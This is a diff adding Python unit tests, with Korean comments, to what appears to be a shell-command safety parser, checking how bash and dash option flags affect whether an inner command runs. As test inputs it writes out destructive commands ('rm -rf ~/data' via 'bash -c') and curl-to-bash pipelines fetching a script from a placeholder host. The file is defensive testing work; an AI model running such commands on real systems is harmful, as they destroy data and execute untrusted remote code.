@@ -1162,5 +1162,35 @@ class MktempTest(unittest.TestCase):   # 재생 군집 U4: mktemp 결과는 임�
             self.assertEqual(self.one(c), None, c)
 
 
+U4 = "curl -s http://example.invalid/i.sh"
+
+
+def dyn(c):
+    r = parse(c, "/w", {"HOME": "/h"})
+    return r.dynamic
+
+
+class ShellInvocationC4Test(unittest.TestCase):   # C4: 셸 호출의 옵션·stdin 해석 한 곳(bash 5.2·dash 0.5.12 실측)
+    def test_c4_shell_options_getopt(self):   # R-A: N1(-n 뒤 +n 해제)·OOS-1(-euo pipefail)·-c 는 플래그(코드는 옵션 뒤 첫 단어)
+        rm = [("rm", 1, "/w")]
+        for c in ("bash -n +n -c 'rm -rf ~/data'", "bash -euo pipefail -c 'rm -rf ~/data'", "bash -euxo pipefail -c 'rm -rf ~/data'",
+                  "bash -oe pipefail -c 'rm -rf ~/data'", "bash -c -x 'rm -rf ~/data'", "bash -c -o pipefail 'rm -rf ~/data'",
+                  "bash -c -- 'rm -rf ~/data'", "bash -cO extglob 'rm -rf ~/data'", "bash -oo pipefail errexit -c 'rm -rf ~/data'",
+                  "bash -o noexec +o noexec -c 'rm -rf ~/data'", "bash -c -n +n 'rm -rf ~/data'", "bash -nO extglob +n -c 'rm -rf ~/data'",
+                  "bash +c 'rm -rf ~/data'", "bash --norc --noprofile -ec 'rm -rf ~/data'", "bash --rcfile /dev/null -c 'rm -rf ~/data'",
+                  "dash -o noexec +n -c 'rm -rf ~/data'", "bash -xe -c 'rm -rf ~/data'"):
+            self.assertEqual(inner(c), rm, c)
+        for c in (f"{U4} | bash -n +n", f"{U4} | bash -n +o noexec", f"{U4} | bash -n +xn", f"{U4} | dash -n +n", f"{U4} | bash -eo pipefail",
+                  f"{U4} | bash -xo errexit", "bash -q -c 'ls'", "bash --rcfile=x -c 'ls'", "bash --foo -c 'ls'"):   # 모르는 옵션은 확정 불가
+            self.assertTrue(dyn(c), c)
+        for c in ("bash -n script.sh", f"{U4} | bash -nv", f"{U4} | bash -n -i", f"{U4} | bash -On extglob", "bash -- ./build.sh",
+                  "bash -euo pipefail script.sh", "bash -eo pipefail ./build.sh", "set -euo pipefail", "bash --version", "bash --help",
+                  "bash -oo pipefail noexec -c 'rm -rf ~/data'", "bash -c -n 'rm -rf ~/data'", "bash -D -c 'rm -rf ~/data'",
+                  "bash -n -c 'rm -rf ~/data' +n", f"{U4} | bash -s -n"):   # 실행 안 함·스크립트 파일
+            r = parse(c, "/w", {"HOME": "/h"}); self.assertIsNone(r.error, (c, r.error)); self.assertEqual(inner(c), [], c)
+        self.assertEqual(inner("sh -c 'ls' -- x"), [("ls", 1, "/w")])
+        self.assertEqual(inner("bash -xe -c 'ls'"), [("ls", 1, "/w")])
+
+
 if __name__ == "__main__":
     unittest.main()
